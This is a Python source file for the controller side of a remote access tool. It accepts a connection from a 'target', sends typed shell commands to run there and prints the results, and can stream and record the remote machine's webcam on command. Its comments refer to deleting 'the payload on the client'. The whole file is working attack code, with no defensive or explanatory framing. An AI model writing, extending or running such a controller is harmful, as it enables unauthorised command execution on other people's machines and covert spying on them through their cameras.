import socket  # For network (client-server) communication.
import cv2  # For video recording.
import signal  # For handling the Ctrl+C command when exiting the program.
import threading  # For running the video recording in a separate thread.
import numpy as np  # For working with video frames.

SERVER_HOST = "127.0.0.1"  # Server's IP address (localhost for testing)
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages

SEPARATOR = "<sep>"

# Create the socket object.
s = socket.socket()
# Bind the socket to the server address and port.
s.bind((SERVER_HOST, SERVER_PORT))
# Enable reusing the address.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Set the server to listen for incoming connections.
s.listen(5)
print(f"Listening as {SERVER_HOST} on port {SERVER_PORT}...")

# Accept an incoming client connection.
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Receive the client's current working directory and OS.
cwd = client_socket.recv(BUFFER_SIZE).decode()
targets_os = client_socket.recv(BUFFER_SIZE).decode()

# Print the information received from the client.
print("[+] Current working directory: ", cwd)
print("[+] Target's Operating System: ", targets_os)

# Global variables for video capture.
cap = None
out = None
recording_thread = None

# Function to handle the Ctrl+C signal (gracefully close the connection).
def signal_handler(sig, frame):
    print('Saving video and exiting...')
    if recording_thread is not None:
        recording_thread.join()
    if cap is not None and out is not None:
        cap.release()
        out.release()
    cv2.destroyAllWindows()
    client_socket.close()
    s.close()
    exit(0)

# Set up the signal handler.
signal.signal(signal.SIGINT, signal_handler)

# Function to handle video recording and display.
def record_video():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for MP4 format.
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))  # Save video to file.
    
    while True:
        # Receive the frame size from the client.
        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
        if not frame_size:
            break
        
        # Receive the actual frame data.
        frame_data = b''
        while len(frame_data) < frame_size:
            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
            if not packet:
                break
            frame_data += packet
        
        if not frame_data:
            break

        # Decode the frame data and display it.
        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)  # Save frame to the video file.
        cv2.imshow('Remote Camera Feed', frame)  # Display the frame.
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    
    # Release video writer and close window after recording stops.
    out.release()
    cv2.destroyAllWindows()

# Main loop to handle commands sent to the client.
while True:
    # Get the command from the user.
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue  # Ignore empty commands.
    
    # Send the command to the client.
    client_socket.send(command.encode())
    
    if command.lower() == "exit":
        # Exit the loop if 'exit' command is issued.
        break
    elif command.lower() == "start":
        # Start recording video in a separate thread.
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        print("Video recording started.")
    elif command.lower() == "kill":
        # Send the 'kill' command to terminate and delete the payload on the client.
        print("Sending kill command...")
        client_socket.send(command.encode())
        break
    else:
        # Receive the command output from the client.
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)  # Update the working directory.
        print(results)

# Ensure the recording thread finishes and close connections.
if recording_thread is not None:
    recording_thread.join()
client_socket.close()
s.close()
